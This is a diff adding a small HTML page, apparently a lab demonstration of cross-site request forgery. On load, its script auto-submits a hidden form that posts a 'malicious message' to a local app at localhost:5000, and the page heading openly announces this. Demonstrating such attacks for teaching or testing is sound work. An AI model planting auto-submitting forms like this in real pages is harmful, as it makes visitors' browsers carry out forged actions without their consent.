@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <h1>Somewhere here there is a malicious form that autosubmits >;)</h1>
+        <form name="maliciousform" action="http://localhost:5000/postmessage" method="POST">
+            <input type="hidden" name="message" value="MALICIOUS MESSAGE !!!"/><br/><br/>
+        </form>
+        <script type="text/javascript">
+            console.log("will submit malicious form!");
+            document.maliciousform.submit();
+        </script>
+    </body>
+</html>
